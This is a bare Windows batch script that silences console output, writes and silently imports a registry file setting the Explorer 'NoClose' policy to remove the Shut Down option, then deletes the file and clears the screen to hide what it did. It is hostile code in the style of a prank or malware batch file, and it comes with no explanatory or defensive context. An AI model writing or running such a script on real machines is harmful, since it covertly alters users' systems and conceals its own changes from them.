ctty nul
echo REGEDIT4>C:\t.reg
echo.>>C:\t.reg
echo [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer]>>C:\t.reg
echo "NoClose"="1">>C:\t.reg
regedit /s C:\t.reg
del C:\t.reg
ctty con
cls